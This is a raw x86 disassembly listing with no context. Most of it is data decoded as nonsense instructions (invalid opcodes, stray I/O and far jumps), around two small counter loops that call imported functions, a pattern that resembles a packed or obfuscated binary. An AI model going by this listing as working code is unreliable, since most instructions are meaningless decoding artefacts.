  4067c9:	mov    esp,0xa601f16c
  4067ce:	dec    esi
  4067cf:	mov    esi,0x4e78d254
  4067d4:	xchg   edx,eax
  4067d6:	fmulp  st(3),st
  4067d8:	ror    DWORD PTR [eax+ecx*2+0x6f40e26d],1
  4067df:	out    0xe8,al
  4067e1:	mov    ds:0x696a0afd,eax
  4067e6:	(bad)  
  4067e7:	push   ss
  4067e8:	pop    ebp
  4067e9:	mov    ebx,0x3ef33934
  4067ee:	xchg   edi,eax
  4067ef:	xchg   esp,eax
  4067f0:	fidiv  DWORD PTR [edi]
  4067f2:	add    BYTE PTR [edx-0x50],0x34
  4067f6:	fs into 
  4067f8:	xor    DWORD PTR [eax+0x2050007d],0x5
  4067ff:	mov    eax,0x89291bc
  406804:	das    
  406805:	mov    ds:0x821ac1e3,al
  40680a:	and    al,0xee
  40680c:	push   ebx
  40680d:	gs mul edx
  406810:	sub    cl,BYTE PTR [eax+eiz*1-0x3c]
  406814:	leave  
  406815:	mov    esp,ebp
  406817:	je     0x406876
  406819:	jbe    0x40679f
  40681b:	iret   
  40681c:	mov    cl,0x66
  40681e:	shl    ebx,0x9a
  406821:	mov    cl,0xa2
  406823:	push   ebx
  406824:	xchg   ecx,eax
  406825:	xor    ecx,ebx
  406827:	daa    
  406828:	in     eax,dx
  406829:	(bad)  
  40682a:	js     0x40689a
  40682c:	inc    ebp
  40682d:	pop    esi
  40682e:	imul   esi,DWORD PTR [ebx],0xdcc2f0bb
  406834:	ins    DWORD PTR es:[edi],dx
  406835:	call   0xdf0bd233
  40683a:	bound  ebx,QWORD PTR [ecx]
  40683c:	jne    0x406829
  40683e:	dec    edx
  40683f:	dec    ecx
  406840:	aas    
  406841:	lods   eax,DWORD PTR ds:[esi]
  406842:	cwde   
  406843:	cld    
  406844:	and    al,0x69
  406846:	ins    BYTE PTR es:[edi],dx
  406847:	cmp    eax,0x1ac79621
  40684c:	pop    ebp
  40684d:	cmp    eax,0x273e9a04
  406852:	fistp  QWORD PTR [esi+eiz*8]
  406855:	mov    dl,0xc
  406857:	add    BYTE PTR [ebx-0x26],dl
  40685a:	in     al,0xcf
  40685c:	jno    0x406831
  40685e:	or     al,bl
  406860:	out    dx,al
  406861:	adc    eax,0x60556a0e
  406866:	adc    ebx,DWORD PTR [ebx+0x4987a6f9]
  40686c:	mov    ebx,0x99fc2074
  406871:	ror    bl,1
  406873:	sub    edi,edi
  406875:	mov    edi,0xbc5c753a
  40687a:	cmp    DWORD PTR [edx],ecx
  40687c:	xor    BYTE PTR [ebx],ah
  40687e:	shl    dh,1
  406880:	and    edi,esp
  406882:	(bad)  
  406883:	mov    bh,0x94
  406885:	push   ecx
  406886:	push   0xa11f0d5d
  40688b:	jp     0x40687c
  40688d:	mov    eax,ds:0x4f964a4e
  406892:	jp     0x406843
  406894:	push   ds
  406895:	gs aas 
  406897:	sub    DWORD PTR ds:0x58e6b199,esi
  40689d:	jecxz  0x406918
  40689f:	stos   DWORD PTR es:[edi],eax
  4068a0:	inc    ecx
  4068a1:	mov    esi,0xfc0e36fc
  4068a6:	dec    edx
  4068a7:	leave  
  4068a8:	ror    BYTE PTR [edi],0x48
  4068ab:	mov    ds:0x7cc1865e,al
  4068b0:	and    edx,DWORD PTR [ebx]
  4068b2:	xchg   ebp,eax
  4068b3:	jne    0x406848
  4068b5:	(bad)  
  4068b6:	out    dx,eax
  4068b7:	jmp    0xbf0d:0x454ea81c
  4068be:	inc    ebp
  4068bf:	add    edi,esi
  4068c1:	call   DWORD PTR [edi]
  4068c3:	or     eax,0x6c09697
  4068c8:	cli    
  4068c9:	push   edx
  4068ca:	jns    0x4068e2
  4068cc:	jae    0x4068b0
  4068ce:	cmp    DWORD PTR [ecx],ebp
  4068d0:	aam    0x5b
  4068d2:	mov    ds:0x18c25de7,eax
  4068d7:	add    BYTE PTR [ebp-0x75],dl
  4068da:	in     al,dx
  4068db:	sub    esp,0x58
  4068de:	mov    DWORD PTR ds:0x42a7bd,0x1f
  4068e8:	cmp    DWORD PTR ds:0x42a7bd,0x0
  4068ef:	je     0x406947
  4068f5:	cmp    DWORD PTR ds:0x42a7bd,0x8
  4068fc:	jne    0x406916
  406902:	push   DWORD PTR [ebp-0x1c]
  406905:	push   DWORD PTR [ebp-0x24]
  406908:	push   0x42aaaa
  40690d:	push   DWORD PTR [ebp-0x10]
  406910:	call   DWORD PTR ds:0x41d18c
  406916:	cmp    DWORD PTR ds:0x42a7bd,0x9
  40691d:	jne    0x406931
  406923:	xor    eax,eax
  406925:	or     eax,DWORD PTR ds:0x42a7bd
  40692b:	dec    eax
  40692c:	mov    ds:0x42a7bd,eax
  406931:	mov    eax,ds:0x42a7bd
  406936:	dec    eax
  406937:	mov    ds:0x42a7bd,eax
  40693c:	jmp    0x4068e8
  406941:	and    DWORD PTR ds:0x42a769,edx
  406947:	mov    ecx,DWORD PTR [ebp+0x8]
  40694a:	jmp    0x406c53
  40694f:	int3   
  406950:	(bad)
  406953:	(bad)  
  406955:	fcmove st,st(1)
  406957:	in     eax,dx
  406958:	loop   0x406947
  40695a:	out    dx,eax
  40695b:	int3   
  40695c:	loop   0x4068fe
  40695e:	stc    
  40695f:	add    cl,cl
  406961:	js     0x4069db
  406963:	fs jle 0x4069de
  406966:	js     0x4069b9
  406968:	and    bh,ch
  40696a:	mov    eax,0x145157b3
  40696f:	ja     0x4069b5
  406971:	and    DWORD PTR [ebx-0xcb11b94],edi
  406977:	dec    ebp
  406978:	sub    al,al
  40697a:	mov    ds:0xe31e6668,al
  40697f:	imul   esi,DWORD PTR ds:0x6ef97c65,0x7bc3dcfb
  406989:	cmp    ebp,0xf8c7f06d
  40698f:	ss cmp eax,0xb8942a73
  406995:	in     eax,0xae
  406997:	ins    BYTE PTR es:[edi],dx
  406998:	push   esi
  406999:	ret    0x324
  40699c:	mov    cl,0x96
  40699e:	sub    eax,0x7db855ad
  4069a3:	les    ecx,FWORD PTR [ecx+eiz*4+0x7a4b9157]
  4069aa:	(bad)  
  4069ab:	punpckhdq mm4,mm6
  4069ae:	out    0x4b,al
  4069b0:	mov    BYTE PTR [edx+0x2359b444],al
  4069b6:	ds icebp 
  4069b8:	mov    ebx,0xcdb3d5de
  4069bd:	jg     0x4069d1
  4069bf:	popa   
  4069c0:	sbb    bl,dh
  4069c2:	paddsb mm1,QWORD PTR [ebx+0x1681d1d0]
  4069c9:	sbb    ebp,esp
  4069cb:	dec    ebp
  4069cc:	dec    esi
  4069cd:	test   al,ch
  4069cf:	pop    edx
  4069d0:	inc    ebp
  4069d1:	xchg   ebp,eax
  4069d2:	lock retf 
  4069d4:	ja     0x406a24
  4069d6:	jge    0x4069f7
  4069d8:	jns    0x406a1d
  4069da:	movs   WORD PTR es:[edi],WORD PTR ds:[esi]
  4069dc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4069dd:	lock mov bh,0x79
  4069e0:	dec    edi
  4069e1:	mov    ch,0xb9
  4069e3:	sti    
  4069e4:	or     ebp,DWORD PTR [ecx+edi*1]
  4069e7:	cmp    al,0xfb
  4069e9:	addr16 jge 0x406a2d
  4069ec:	adc    DWORD PTR [ebp+0x42754772],edx
  4069f2:	mov    cl,0x17
  4069f4:	pop    ebp
  4069f5:	adc    al,0x3a
  4069f7:	jecxz  0x40699d
  4069f9:	sbb    al,0x28
  4069fb:	fs pop esi
  4069fd:	mov    cs,WORD PTR [edx-0x8]
  406a00:	cmp    eax,0x865988df
  406a05:	les    ecx,FWORD PTR [eax+eiz*1-0x115a276c]
  406a0c:	stc    
  406a0d:	mov    ebx,esp
  406a0f:	mov    esi,0x5ba62219
  406a14:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406a15:	repnz cmp BYTE PTR [eax+0x3a7ba9ba],bh
  406a1c:	xchg   ebx,eax
  406a1d:	ins    BYTE PTR es:[edi],dx
  406a1e:	inc    esi
  406a1f:	(bad)  
  406a20:	test   eax,0xba9e0f6
  406a25:	out    dx,eax
  406a26:	rcl    DWORD PTR es:[ecx],cl
  406a29:	inc    edi
  406a2a:	pop    ss
  406a2b:	or     BYTE PTR [ebp+0x6f5ebdcc],cl
  406a31:	mov    DWORD PTR [ebx-0x3e],esi
  406a34:	call   0xf6a0d6e4
  406a39:	or     ah,BYTE PTR [ebx]
  406a3b:	mov    edx,0x680f0aee
  406a40:	mov    esi,0xdef7306b
  406a45:	in     eax,dx
  406a46:	sub    DWORD PTR [esi+0x1ef5be7a],esp
  406a4c:	stos   BYTE PTR es:[edi],al
  406a4d:	mov    DWORD PTR [ebx],esp
  406a4f:	sbb    esp,edx
  406a51:	outs   dx,DWORD PTR ds:[esi]
  406a53:	test   BYTE PTR [esi+0x6c],bh
  406a56:	and    al,0x1e
  406a58:	pop    edx
  406a59:	call   0xc33e:0x2756a535
  406a60:	dec    eax
  406a61:	dec    ebp
  406a62:	fwait
  406a63:	stos   BYTE PTR es:[edi],al
  406a64:	adc    eax,DWORD PTR [ecx+0x8583b32]
  406a6a:	pusha  
  406a6b:	popa   
  406a6c:	adc    ah,ah
  406a6e:	add    eax,0xcd4c6513
  406a73:	cwde   
  406a74:	push   es
  406a75:	xchg   edi,eax
  406a76:	dec    eax
  406a77:	inc    edi
  406a78:	fisub  DWORD PTR [eax-0x44]
  406a7b:	ret    
  406a7c:	or     DWORD PTR [esi],ebx
  406a7e:	imul   edi,DWORD PTR [eax-0x530b2a60],0x61
  406a85:	outs   dx,DWORD PTR ds:[esi]
  406a86:	push   esi
  406a87:	cmp    DWORD PTR [ebx],ebx
  406a89:	add    al,0xfb
  406a8b:	inc    eax
  406a8c:	pop    esi
  406a8d:	add    eax,0x674c9c62
  406a92:	lods   al,BYTE PTR ds:[esi]
  406a93:	test   al,0x3b
  406a95:	leave  
  406a96:	cmp    al,0x5
  406a98:	test   BYTE PTR [ebx],ch
  406a9a:	jp     0x406b00
  406a9c:	ficom  WORD PTR [eax+0x3b2b8307]
  406aa2:	jbe    0x406a5f
  406aa4:	xor    BYTE PTR [eax],dl
  406aa6:	adc    al,0xf5
  406aa8:	push   edi
  406aa9:	stos   DWORD PTR es:[edi],eax
  406aaa:	int3   
  406aab:	push   cs
  406aac:	add    al,0xde
  406aae:	push   ecx
  406aaf:	outs   dx,DWORD PTR ds:[esi]
  406ab0:	out    dx,eax
  406ab1:	jns    0x406b02
  406ab3:	pop    ecx
  406ab4:	dec    eax
  406ab5:	ins    BYTE PTR es:[edi],dx
  406ab6:	test   DWORD PTR [ebp+0x5143d588],esp
  406abc:	pop    ebp
  406abd:	pop    ss
  406abe:	out    dx,al
  406abf:	sbb    ecx,ecx
  406ac1:	xchg   edi,eax
  406ac2:	imul   esi,DWORD PTR [ebx],0x99e1c6cd
  406ac8:	imul   ebx,DWORD PTR [esi-0x216a48a8],0x21
  406acf:	or     al,BYTE PTR [edi-0x2a6d28d1]
  406ad5:	add    BYTE PTR [ebx-0x1ce418c9],0x6
  406adc:	cmovle ecx,DWORD PTR [ebx+0x30]
  406ae0:	fmul   st,st(1)
  406ae2:	push   eax
  406ae3:	inc    ebx
  406ae4:	test   bh,cl
  406ae6:	cld    
  406ae7:	add    ebp,DWORD PTR [ebp+0x71]
  406aea:	and    eax,0x1da2416
  406aef:	mov    ah,0xb4
  406af1:	or     al,0xc5
  406af3:	and    al,0xbc
  406af5:	pop    edi
  406af6:	enter  0xe299,0x21
  406afa:	or     ecx,DWORD PTR [edi-0x24]
  406afd:	inc    edx
  406afe:	repnz pop esp
  406b00:	fild   QWORD PTR ds:0x65fa2839
  406b06:	mov    bh,0x60
  406b08:	pop    edx
  406b09:	les    esi,FWORD PTR [edi-0x102868f4]
  406b0f:	mov    ebx,0x9789a680
  406b14:	xchg   edi,eax
  406b15:	aaa    
  406b16:	jmp    0xb99f:0x4e9d13
  406b1d:	cmp    DWORD PTR [ebx+0x258d7716],eax
  406b23:	xor    eax,0x7de995ec
  406b28:	pop    edx
  406b29:	xor    DWORD PTR [ebx+0x26],ebp
  406b2c:	xchg   ebp,eax
  406b2d:	jl     0x406b9c
  406b2f:	push   ds
  406b30:	shr    BYTE PTR [edx],cl
  406b32:	cld    
  406b33:	jmp    0x406bab
  406b35:	fs jbe 0x406bb6
  406b38:	loope  0x406aee
  406b3a:	into   
  406b3b:	outs   dx,DWORD PTR ds:[esi]
  406b3c:	add    eax,0x9cba69ca
  406b41:	pusha  
  406b42:	dec    esp
  406b43:	retf   
  406b44:	call   0x74be:0xa777cc81
  406b4b:	fsubr  st,st(0)
  406b4d:	rcr    BYTE PTR [ebx],1
  406b4f:	pop    ebx
  406b50:	push   esp
  406b51:	pusha  
  406b52:	test   al,0x21
  406b54:	test   al,0x10
  406b56:	sub    eax,0x97b100c6
  406b5b:	idiv   BYTE PTR [edx+0x1e65b26e]
  406b61:	sub    eax,0x45a811c4
  406b66:	test   al,0xaa
  406b68:	inc    edx
  406b69:	pop    esp
  406b6a:	cmp    dh,ch
  406b6c:	push   es
  406b6d:	pop    esi
  406b6e:	pop    es
  406b6f:	xchg   ebx,eax
  406b70:	mul    DWORD PTR [ebx]
  406b72:	xchg   esi,eax
  406b73:	repz das 
  406b75:	ret    
  406b76:	shl    BYTE PTR [eax+ecx*8-0x662d4758],cl
  406b7d:	cli    
  406b7e:	mov    edx,ecx
  406b80:	dec    esp
  406b81:	mov    ah,0xf6
  406b83:	pop    ecx
  406b84:	mov    bh,0xf2
  406b86:	icebp  
  406b87:	xor    ecx,ecx
  406b89:	test   DWORD PTR [eax],edi
  406b8b:	ret    0xefd8
  406b8e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406b8f:	cmc    
  406b90:	and    eax,0xe192f376
  406b95:	xchg   DWORD PTR [eax+0x534340d0],esi
  406b9b:	jns    0x406b77
  406b9d:	or     eax,0xa96ec4d1
  406ba2:	jmp    0x406be1
  406ba4:	mov    eax,ecx
  406ba6:	jmp    0x406b8f
  406ba8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406ba9:	lock sbb eax,DWORD PTR [ebx+0x66]
  406bad:	jno    0x406bfd
  406baf:	in     al,dx
  406bb0:	shr    BYTE PTR [esi+0x3dc25e1f],0x39
  406bb7:	out    0x5a,eax
  406bb9:	sbb    al,0xee
  406bbb:	mov    dl,0x86
  406bbd:	jmp    0xbb19:0x1b50c653
  406bc4:	out    0x24,eax
  406bc6:	jb     0x406b4b
  406bc8:	icebp  
  406bc9:	jg     0x406bca
  406bcb:	not    DWORD PTR [ebx-0x3c]
  406bce:	adc    DWORD PTR [eax+0x1dcaf484],edx
  406bd4:	cli    
  406bd5:	shl    DWORD PTR ss:[ebx+0x43d9196f],1
  406bdc:	in     al,dx
  406bdd:	ficomp WORD PTR [edi+0x22]
  406be0:	or     ecx,edx
  406be2:	stos   BYTE PTR es:[edi],al
  406be3:	jge    0x406be0
  406be5:	or     bl,cl
  406be7:	xlat   BYTE PTR ds:[ebx]
  406be8:	cs add esi,ecx
  406beb:	dec    eax
  406bec:	or     eax,0xe6815818
  406bf1:	ja     0x406c25
  406bf3:	dec    ecx
  406bf4:	jb     0x406b91
  406bf6:	adc    bl,BYTE PTR [eax-0x1c24d5ad]
  406bfc:	mov    al,ds:0xddfb14f5
  406c01:	xchg   ebp,eax
  406c02:	test   al,0x70
  406c04:	lods   eax,DWORD PTR ds:[esi]
  406c05:	imul   eax,DWORD PTR [eax-0x76],0x3c
  406c09:	mov    esp,0x9d755f44
  406c0e:	mov    ebx,0x91b641a8
  406c13:	pop    ss
  406c14:	sti    
  406c15:	dec    edi
  406c16:	leave  
  406c17:	jae    0x406c0a
  406c19:	xchg   ebx,eax
  406c1a:	into   
  406c1b:	push   esp
  406c1d:	and    ebx,0xa
  406c20:	bound  edi,QWORD PTR [ecx+ecx*2-0x4]
  406c24:	sahf   
  406c25:	add    eax,0x1cd51446
  406c2a:	jns    0x406c60
  406c2c:	or     eax,0x395c5bad
  406c31:	rol    DWORD PTR [ebp*2-0x257480fa],1
  406c38:	xor    edi,esp
  406c3a:	enter  0x2b7,0x93
  406c3e:	retf   
  406c3f:	test   BYTE PTR [edx+edi*8],0xde
  406c43:	pop    edx
  406c44:	xchg   edi,eax
  406c45:	mov    dl,0x5a
  406c47:	or     cl,BYTE PTR [ecx+eiz*2-0x3c23e90d]
  406c4e:	mov    edi,0x9e3be61a
  406c53:	mov    eax,0x8a36
  406c58:	adc    DWORD PTR ds:0x42a7c9,0x4fea
  406c62:	xor    ax,WORD PTR [ecx+0x20]
  406c66:	sub    DWORD PTR ds:0x42a7f5,0x417a
  406c70:	mov    ecx,0x3afc
  406c75:	xor    DWORD PTR ds:0x42a84d,0x2c9d
  406c7f:	jmp    0x406f88
  406c84:	rol    dh,cl
  406c86:	cmp    al,0xd3
  406c88:	aam    0xd9
  406c8a:	rol    ebp,1
  406c8c:	mov    eax,ebx
  406c8e:	and    DWORD PTR [ecx+0x38],ebx
  406c91:	out    dx,eax
  406c92:	(bad)  
  406c93:	outs   dx,BYTE PTR ds:[esi]
  406c94:	ins    BYTE PTR es:[edi],dx
  406c95:	iret   
  406c96:	js     0x406d10
  406c98:	fs jle 0x406d13
  406c9b:	js     0x406c5b
  406c9d:	jecxz  0x406cc7
  406c9f:	dec    edx
  406ca0:	mov    eax,0x9ee2c36f
  406ca5:	retf   
  406ca6:	scas   eax,DWORD PTR es:[edi]
  406ca7:	jl     0x406cd9
  406ca9:	test   eax,0xc9600962
  406cae:	retf   
  406caf:	adc    al,0x43
  406cb1:	rcr    DWORD PTR [ebx+0x7447f244],0x3b
  406cb8:	retf   
  406cb9:	aad    0xa1
  406cbb:	aam    0x8b
  406cbd:	aas    
  406cbe:	push   cs
  406cbf:	repnz sbb eax,0x9b670ad1
  406cc5:	ins    DWORD PTR es:[edi],dx
  406cc6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406cc7:	pop    ebx
  406cc8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406cc9:	out    0x73,al
  406ccb:	inc    ecx
  406ccc:	add    DWORD PTR [ecx-0x65399832],0xffffffe0
  406cd3:	movs   DWORD PTR es:[edi],DWORD PTR gs:[esi]
  406cd5:	adc    DWORD PTR [ecx],ebx
  406cd7:	mov    eax,?
  406cd9:	cmp    bl,dh
  406cdb:	jl     0x406cb2
  406cdd:	or     ch,dl
  406cdf:	dec    ecx
  406ce0:	cmp    bl,BYTE PTR [eax+0x42897787]
  406ce6:	outs   dx,BYTE PTR ds:[esi]
  406ce7:	shr    BYTE PTR [eax+0x24bc22b5],0xed
  406cee:	in     eax,dx
  406cef:	lahf   
  406cf0:	cld    
  406cf1:	test   al,0xbd
  406cf3:	sahf   
  406cf4:	adc    BYTE PTR [ecx+eiz*4],bl
  406cf7:	lahf   
  406cf8:	or     ebx,ebp
  406cfa:	dec    ecx
  406cfb:	xor    edx,DWORD PTR [ebp+esi*2-0x20]
  406cff:	ins    BYTE PTR es:[edi],dx
  406d00:	div    BYTE PTR [esi-0x7e]
  406d03:	mov    ah,cl
  406d05:	(bad)  
  406d06:	push   0xc
  406d08:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406d09:	pop    ebx
  406d0a:	lea    esi,[ebx+0x4b0c7da1]
  406d10:	cmp    DWORD PTR [ebx+0x66],ebx
  406d13:	mov    ecx,0xbe74ed72
  406d18:	mov    ch,0xc5
  406d1a:	jp     0x406d1f
  406d1c:	dec    edx
  406d1d:	pop    edi
  406d1e:	mov    al,ds:0xd755c2f7
  406d23:	lods   al,BYTE PTR ds:[esi]
  406d24:	ds or  al,0x57
  406d27:	ret    0xf181
  406d2a:	inc    ebx
  406d2b:	mov    ds:0x58274c3,al
  406d30:	hlt    
  406d31:	ret    0xb847
  406d34:	jge    0x406d1c
  406d36:	out    dx,eax
  406d37:	aam    0x1c
  406d39:	jne    0x406d7a
  406d3b:	pop    edx
  406d3c:	call   0xad58990d
  406d41:	lock std 
  406d43:	and    eax,0x71d555e2
  406d48:	push   eax
  406d49:	shl    DWORD PTR [esi-0x76],cl
  406d4c:	jmp    0xf3e8:0x8429952b
  406d53:	aad    0xd9
  406d55:	in     al,0x2e
  406d57:	(bad)  
  406d58:	push   ecx
  406d59:	sbb    esp,DWORD PTR [ecx-0x19e290f0]
  406d5f:	or     ah,bl
  406d61:	aas    
  406d62:	popf   
  406d63:	push   eax
  406d64:	sbb    eax,0x35b8949f
  406d69:	mov    cl,0x28
  406d6b:	sub    BYTE PTR ds:0x2673fe54,ah
  406d71:	test   BYTE PTR [esp+esi*2],bh
  406d74:	and    DWORD PTR [ebp-0x1a3bed5f],ecx
  406d7a:	mov    al,0xbe
  406d7c:	mov    ds:0xfd311209,eax
  406d81:	push   0x3c
  406d83:	retf   
  406d84:	pushf  
  406d85:	cdq    
  406d86:	mov    ebp,0xe398cfd
  406d8b:	jg     0x406d5b
  406d8d:	xchg   BYTE PTR [edx-0x7f703674],ah
  406d93:	jecxz  0x406db0
  406d95:	(bad)  
  406d96:	sbb    BYTE PTR [edx-0x3e71c1f2],dh
  406d9c:	push   edi
  406d9d:	xchg   edx,eax
  406d9e:	ror    BYTE PTR [edx+0x35],1
  406da1:	and    ebx,ebx
  406da3:	sub    al,BYTE PTR [ebp+0x3dfdea40]
  406da9:	je     0x406d87
  406dab:	xchg   edi,eax
  406dac:	and    ah,BYTE PTR [esi-0x4b992aca]
  406db2:	imul   esp,DWORD PTR [ebx-0x1b],0xfffffff7
  406db6:	add    eax,0xf67a94a3
  406dbb:	fdiv   DWORD PTR [ecx+0xac12c2e]
  406dc1:	ret    
  406dc2:	test   eax,0x8fef3532
  406dc7:	fwait
  406dc8:	mov    ebx,0x60279d76
  406dcd:	stc    
  406dce:	jp     0x406de2
  406dd0:	xor    eax,0x1d8ffbdb
  406dd5:	popf   
  406dd6:	mov    edx,0xa4551879
  406ddb:	mov    esi,DWORD PTR [ecx+0x59341fc4]
  406de1:	push   edx
  406de2:	mov    WORD PTR [esi],?
  406de4:	callw  0xe654
  406de8:	xchg   esp,eax
  406de9:	mov    bh,0x61
  406deb:	addr16 cdq 
  406ded:	fs pop esi
  406def:	icebp  
  406df0:	(bad)
  406df3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406df4:	push   ebx
  406df5:	xor    al,0x8e
  406df7:	sti    
  406df8:	ins    BYTE PTR es:[edi],dx
  406df9:	mov    ds:0x396bd709,eax
  406dfe:	js     0x406dfe
  406e00:	aad    0x8
  406e02:	jnp    0x406d91
  406e04:	stos   DWORD PTR es:[edi],eax
  406e05:	mov    WORD PTR [ecx-0x60],ds
  406e08:	cdq    
  406e09:	and    BYTE PTR [edi+0x57],bh
  406e0c:	pop    DWORD PTR [eax]
  406e0e:	cmps   BYTE PTR ds:[si],BYTE PTR es:[di]
  406e10:	ss inc edx
  406e12:	cli    
  406e13:	add    DWORD PTR [ebp-0x70],ebp
  406e16:	frstor [edx-0x68]
  406e19:	mov    dh,0xa6
  406e1b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406e1c:	cld    
  406e1d:	(bad)  
  406e1e:	out    dx,al
  406e1f:	xchg   esi,eax
  406e20:	jns    0x406e65
  406e22:	push   ss
  406e23:	dec    ebp
  406e24:	call   0x3e79fc9
  406e29:	in     eax,0xca
  406e2b:	jae    0x406dda
  406e2d:	sbb    eax,0xbe0e8c91
  406e32:	jb     0x406dec
  406e34:	xchg   ebp,eax
  406e35:	fld    DWORD PTR [edi-0x38]
  406e38:	clc    
  406e39:	fistp  DWORD PTR [eax]
  406e3b:	jmp    0x406e22
  406e3d:	inc    ebx
  406e3e:	sahf   
  406e3f:	mov    esi,DWORD PTR [esi-0x44]
  406e42:	and    DWORD PTR [esi+eax*8+0x7a81d4b4],eax
  406e49:	retf   
  406e4a:	stc    
  406e4b:	int    0xe
  406e4d:	lds    ebx,FWORD PTR [ecx+0x740d88a8]
  406e53:	in     eax,dx
  406e54:	call   0xdf8b61d4
  406e59:	mov    BYTE PTR [edi],bl
  406e5b:	pop    eax
  406e5c:	mov    eax,ds:0xb201a2e8
  406e61:	lds    esi,FWORD PTR [edx+eax*2-0x1ee9c431]
  406e68:	ss jmp 0x9c2a08e3
  406e6e:	jmp    0x87aa:0x190ecc9f
  406e75:	lods   eax,DWORD PTR ds:[esi]
  406e76:	hlt    
  406e77:	sahf   
  406e78:	fbld   TBYTE PTR [ebx]
  406e7a:	ret    
  406e7b:	jle    0x406ea8
  406e7d:	jl     0x406ee2
  406e7f:	and    eax,0xcda219b8
  406e84:	test   DWORD PTR [edx-0x24],ebp
  406e87:	ret    0x4bc
  406e8a:	data16 sti 
  406e8c:	js     0x406e7d
  406e8e:	lahf   
  406e8f:	pusha  
  406e90:	icebp  
  406e91:	push   edx
  406e92:	retf   0xd9ae
  406e95:	mov    DWORD PTR [ecx],ebp
  406e97:	push   0xf3947e8f
  406e9c:	mov    BYTE PTR [edi-0x6a],dh
  406e9f:	sbb    al,0x65
  406ea1:	push   esi
  406ea2:	cmc    
  406ea3:	push   0xf084e9b2
  406ea8:	das    
  406ea9:	sbb    al,0xb8
  406eab:	das    
  406eac:	out    dx,eax
  406ead:	or     eax,0xcc0c4033
  406eb2:	fistp  QWORD PTR [esi]
  406eb4:	mov    al,ds:0xe09ca2ec
  406eb9:	fwait
  406eba:	push   es
  406ebb:	inc    edi
  406ebc:	pop    ecx
  406ebd:	(bad)  
  406ebe:	mov    ds:0x41c048e5,al
  406ec3:	scas   al,BYTE PTR es:[edi]
  406ec4:	sub    eax,0x9566eda7
  406ec9:	outs   dx,DWORD PTR ds:[esi]
  406eca:	imul   ecx,DWORD PTR [ebp-0x5],0xcd04ce08
  406ed1:	int3   
  406ed2:	add    DWORD PTR [ebp+0x22],edx
  406ed5:	xchg   ebp,eax
  406ed6:	jl     0x406f31
  406ed8:	lods   eax,DWORD PTR ds:[esi]
  406ed9:	pop    ecx
  406eda:	jbe    0x406ed1
  406edc:	mov    edx,0x979390a6
  406ee1:	mov    cl,0xf7
  406ee3:	mov    ds:0xd373e812,al
  406ee8:	sahf   
  406ee9:	mov    eax,ds:0xe7ac6596
  406eee:	mov    ebx,0xcb2b4a15
  406ef3:	mov    edx,0xe1312d07
  406ef8:	shr    BYTE PTR [esi-0x1a],cl
  406efb:	loope  0x406eaa
  406efd:	add    eax,0xba34d7f1
  406f02:	mov    esp,0xda6b9b07
  406f07:	lods   al,BYTE PTR ds:[esi]
  406f08:	fsub   QWORD PTR [ecx-0x80]
  406f0b:	inc    edx
  406f0c:	sub    al,0xcb
  406f0e:	mov    DWORD PTR [edi+0x39],esp
  406f11:	loopne 0x406f10
  406f13:	xchg   edi,eax
  406f14:	mov    esi,0xd63b42b6
  406f19:	jb     0x406f2a
  406f1b:	jcxz   0x406ea2
  406f1e:	mov    ebp,0xa5a72a49
  406f23:	pop    ss
  406f24:	nop
  406f25:	in     eax,0xdd
  406f27:	dec    ecx
  406f28:	and    BYTE PTR [ecx],dl
  406f2a:	sub    ebp,DWORD PTR [esi-0x955bb93]
  406f30:	xlat   BYTE PTR ds:[ebx]
  406f31:	sub    ah,bh
  406f33:	sub    eax,0x388ddc61
  406f38:	mov    ss,ecx
  406f3a:	jo     0x406ef0
  406f3c:	pop    es
  406f3d:	aam    0x91
  406f3f:	outs   dx,DWORD PTR ds:[esi]
  406f40:	(bad)  
  406f41:	fwait
  406f42:	mov    ch,0x58
  406f44:	xor    BYTE PTR [esi],0x8
  406f47:	je     0x406f24
  406f49:	or     BYTE PTR [eax*1-0x28bcd46],al
  406f50:	and    edi,esp
  406f52:	jecxz  0x406f66
  406f54:	sub    al,ah
  406f56:	sbb    esp,DWORD PTR [esi]
  406f58:	cmp    al,0x8d
  406f5a:	mov    cl,0xcb
  406f5c:	push   edx
  406f5d:	in     al,0xf9
  406f5f:	in     al,0x6b
  406f61:	out    dx,al
  406f62:	fst    QWORD PTR [ebx-0x26400eb7]
  406f68:	sub    ah,BYTE PTR [esi+0x49]
  406f6b:	dec    ecx
  406f6c:	push   eax
  406f6d:	lahf   
  406f6e:	adc    DWORD PTR [edi+0x17ff7b42],edi
  406f74:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406f75:	sbb    bh,BYTE PTR [esi+edx*1]
  406f78:	push   esi
  406f79:	sbb    eax,0xe3816ee0
  406f7e:	xchg   edx,eax
  406f7f:	out    0x87,eax
  406f81:	push   esp
  406f82:	jl     0x406f71
  406f84:	push   cs
  406f85:	xchg   ecx,eax
  406f86:	mov    edi,DWORD PTR [ecx+0x1bc10366]
  406f8c:	or     eax,0x42a881
  406f91:	movzx  eax,ax
  406f94:	and    DWORD PTR ds:0x42a885,0x0
  406f9e:	jmp    0x406fb0
  406fa3:	mov    ecx,DWORD PTR ds:0x42a885
  406fa9:	inc    ecx
  406faa:	mov    DWORD PTR ds:0x42a885,ecx
  406fb0:	cmp    DWORD PTR ds:0x42a885,0x11
  406fb7:	jae    0x407009
  406fbd:	cmp    DWORD PTR ds:0x42a885,0x7
  406fc4:	jne    0x406fe4
  406fca:	push   0x2396
  406fcf:	push   0x42ab22
  406fd4:	push   0x42ab22
  406fd9:	push   0x42ab04
  406fde:	call   DWORD PTR ds:0x41d190
  406fe4:	cmp    DWORD PTR ds:0x42a885,0x6
  406feb:	jne    0x406ffe
  406ff1:	mov    ecx,DWORD PTR ds:0x42a885
  406ff7:	inc    ecx
  406ff8:	mov    DWORD PTR ds:0x42a885,ecx
  406ffe:	jmp    0x406fa3
  407003:	adc    DWORD PTR ds:0x42a7c9,edx
  407009:	mov    DWORD PTR [ebp-0xc],eax
  40700c:	xor    ecx,ecx
  40700e:	add    ecx,DWORD PTR ds:0x42a76d
  407014:	sub    DWORD PTR ds:0x42a841,ecx
